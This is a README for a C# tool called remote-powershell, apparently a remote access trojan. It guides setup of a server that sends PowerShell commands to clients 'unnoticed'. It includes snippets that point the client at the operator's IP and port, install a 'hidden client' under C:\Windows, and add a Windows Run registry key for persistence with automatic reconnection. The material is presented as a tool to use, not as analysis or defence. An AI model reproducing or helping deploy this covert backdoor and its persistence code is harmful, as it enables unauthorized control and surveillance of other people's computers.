# remote-powershell

It is a terminal-based application that allows you to execute commands on a remote computer in PowerShell unnoticed.

The application is divided into two main sections: client and server. And there are also special versions of sections that have additional functionality. Each of the sections and versions is briefly described below, as well as a short guide on how to set them up.

## server

The server folder contains all the files related to the part of the program that should be executed on the device from which the commands will be sent.

Just change the IP and Port to the one you need and run the program while waiting for connections.

```csharp
// Change IPAddress.Any (IP) and 8802 (Port) to the one you need
TcpListener tcpListener = new TcpListener(IPAddress.Any, 8802);
```

| Command           | Description                                                                  | Syntax                        | Aliases |
| ----------------- | ---------------------------------------------------------------------------- | ----------------------------- | ------- |
| execute           | Sends and executes the command you specified on the remote client's computer | execute [client-id] [command] | exec, ! |
| connection list   | Gives a list of all active remote connections                                | connection list               |         |
| connection remove | Forcibly disconnects the specified remote client from the server             | connection remove [client-id] |         |
| clear             | Clears the terminal                                                          | clear                         | clr     |
| quit              | Closes the application                                                       | quit                          | exit    |

Despite the fact that the disconnect command forcibly disconnects the remote client from the server, the automatic reconnection function in the client can still restore connections after a while.

## client

The client folder contains all the files related to the part of the program that should be executed on the device to which the commands will be sent and executed.

Just change the IP and Port to the ones you installed on the server and run the program on another device.

```csharp
string host = "127.0.0.1"; // Change 127.0.0.1 (IP) to the one you need
int port = 8802;           // Change 8802 (Port) to the one you need
```

Please note that if you use services that will help you expand your local network, you may have problems reconnecting the client back to the server after it is turned off, as the connection will remain active for the client.

## client-and-installer

Client-and-installer is a version of the application that, when launched, automatically installs the client on a remote computer and adds it to Windows Startup.

```csharp
// Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
if (Environment.ProcessPath != @"C:\Windows\client.exe")
{
    // Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
    string path = @"C:\Windows\client.exe";
    ...
}
```

Ð¡lient-and-installer automatically adds the application to Windows startup, if you want to remove it, then go to the Program.cs file in the client-and-installer folder and remove all lines from 15th to 17th.

```csharp
// Autorun code
RegistryKey registry;
registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
registry.SetValue("client", @"C:\Windows\client.exe");
```
